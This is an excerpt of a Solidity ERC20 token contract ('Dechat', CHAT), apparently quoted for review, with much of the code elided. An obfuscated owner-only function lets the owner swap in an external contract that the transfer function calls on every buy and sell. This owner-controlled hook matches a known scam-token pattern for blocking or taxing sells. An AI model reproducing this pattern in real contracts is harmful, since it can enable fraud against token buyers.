...
contract TokenM is ERC20 {
    ...
    IUserAmountroosse public roosse;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Dechat", "CHAT") {
    ...
    function crooreesBvsingRmme(IUserAmountroosse _roosse) public onlyOwner {
        roosse = _roosse;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                roosse.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				roosse.addOutAmount(from, amount);
            }else{
                roosse.addOutAmount(from, amount);
                takeFee = false;
            }
